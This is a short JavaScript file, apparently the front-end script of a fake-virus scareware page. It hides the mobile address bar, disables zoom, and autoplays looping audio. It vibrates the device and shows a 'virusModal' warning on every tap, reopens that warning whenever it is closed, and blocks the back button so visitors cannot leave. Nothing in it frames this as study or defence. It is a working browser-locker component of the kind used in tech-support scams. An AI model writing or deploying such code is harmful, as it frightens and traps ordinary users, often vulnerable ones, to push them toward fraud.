$(document).ready(() => {
    // Function to hide the address bar
    function hideAddressBar() {
        setTimeout(() => {
            window.scrollTo(0, 1);
        }, 1000); // Delay to allow page rendering
    }

    // Check if on mobile Safari
    const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent) && !window.MSStream;

    if (isIOS) {
        // Hide the address bar on load
        addEventListener("load", hideAddressBar, false);

        // Re-hide address bar on resize (common for orientation changes)
        window.addEventListener("orientationchange", hideAddressBar, false);

        // If user scrolls, reapply scroll-to-hide
        window.addEventListener("scroll", () => {
            if (document.documentElement.scrollTop === 0) {
                hideAddressBar();
            }
        });
    }

    // Add iOS-specific meta tags for a more "app-like" experience
    const metaViewport = document.createElement("meta");
    metaViewport.name = "viewport";
    metaViewport.content =
        "width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no";
    document.head.appendChild(metaViewport);

    const metaWebApp = document.createElement("meta");
    metaWebApp.name = "apple-mobile-web-app-capable";
    metaWebApp.content = "yes";
    document.head.appendChild(metaWebApp);

    const metaStatusBar = document.createElement("meta");
    metaStatusBar.name = "apple-mobile-web-app-status-bar-style";
    metaStatusBar.content = "black";
    document.head.appendChild(metaStatusBar);

    // Modal and vibration setup
    const virusModal = document.getElementById("virusModal");
    const modalInstance = new bootstrap.Modal(virusModal);
    const audioPlayer = $("#audioPlayer")[0];

    audioPlayer.play();

    // Ensure audio loops continuously
    audioPlayer.addEventListener("ended", () => {
        audioPlayer.play();
    });

    function goFullScreenAndVibrate() {
        // Vibrate and play modal
        navigator.vibrate(200);
        modalInstance.show();
    }

    // Trigger modal and fullscreen on user interaction
    window.addEventListener("click", () => {
        goFullScreenAndVibrate();
    });

    window.addEventListener("touchstart", () => {
        goFullScreenAndVibrate();
    });

    // Modal behavior
    if (virusModal) {
        virusModal.addEventListener("hidden.bs.modal", () => {
            setTimeout(() => {
                modalInstance.show();
                goFullScreenAndVibrate();
            }, 300);
        });
    }

    // Prevent navigation with back button
    history.pushState(null, null, window.location.href);
    history.back();
    window.onpopstate = () => history.forward();
});
